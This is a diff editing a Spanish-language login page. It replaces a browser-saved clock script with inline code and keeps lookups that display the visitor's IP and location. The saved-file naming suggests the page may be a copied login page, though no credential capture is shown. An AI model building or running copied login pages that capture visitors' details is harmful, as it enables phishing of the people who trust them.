@@ -1,16 +1,16 @@
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
-"http://www.w3c.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 
 <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
    <head>
-     
+
       <title>Inicio</title>
       <meta content="es" http-equiv="Content-Language">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <meta http-equiv="X-UA-Compatible" content="IE=edge">
       <meta http-equiv="Content-Type" content="text/html;
 charset=utf-8" />
-      
+
 
 
       <link href="css/styles.css" media="all" rel="stylesheet" type="text/css">
@@ -25,7 +25,7 @@ charset=utf-8" />
       <script>
          $.getJSON("https://api.ipify.org?format=json",
                                            function(data) {
-         
+
              // Setting text of element P with id gfg
              $("#gfg").html(data.ip);
          })
@@ -34,7 +34,7 @@ charset=utf-8" />
          $.getJSON("https://ipinfo.io", function (response) {
     $("#ip").html("IP: " + response.ip);
     $("#address").html("" + response.city + ", " + response.country);
-    
+
 })
       </script>
       <script language="JavaScript">
@@ -76,17 +76,20 @@ charset=utf-8" />
                      <div class="row">
                         <div class="col-xs-12 col-sm-7 col-md-7 left-div">
                            <div id="lastIn" class="mua-title-text" style="padding-top: 10px !important;">
-                              <script language="javascript" src="js/jquery.jclockNew.js.descarga" type="text/JavaScript"></script>
+                              
                               <script type="text/javascript">
-                                 $(function($) {        
-                                     var optionsEST = {
-                                         utc: true,
-                                         utcOffset: -5,
-                                         format: "%A %R de %B de %Y %l:%M:%S %P", 
-                                         language: "es"
-                                    }
-                                 $('#jclock1').jclockNew(optionsEST);
-                                 });
+                                 $(function() {
+                                function updateClock() {
+                                  var now = new Date();
+                                  var days = ['Domingo','Lunes','Martes','Miércoles','Jueves','Viernes','Sábado'];
+                                  var months = ['Enero','Febrero','Marzo','Abril','Mayo','Junio','Julio','Agosto','Septiembre','Octubre','Noviembre','Diciembre'];
+                                  var time = now.toLocaleTimeString('es-ES');
+                                  var dateStr = days[now.getDay()] + ' ' + now.getDate() + ' de ' + months[now.getMonth()] + ' de ' + now.getFullYear() + ' ' + time;
+                                  $('#jclock1').text(dateStr);
+                                }
+                                updateClock();
+                                setInterval(updateClock, 1000);
+                              });
                               </script>
                               <div>
                                  <div class="timeText">Fecha y hora actual:</div>
@@ -163,8 +166,8 @@ charset=utf-8" />
                               <button id="btnGo" name="btnGo" class="btn btn-success" type="submit">
                                  Continuar</button>
                               </div>
-         
-                              
+
+
                               <div class="mua-panel_enlances">
                                  <p>
                                     <a href="#">¿Olvidaste tu usuario?</a>
@@ -254,7 +257,7 @@ charset=utf-8" />
                   <div class="mua-title-text pull-right">Copyright ©&nbsp;<span id="fecha">2022</span>&nbsp;.&nbsp;&nbsp;</div>
                </div>
             </div>
-       
+
          </form>
       </div>
       <script src="js/sax.js"></script>
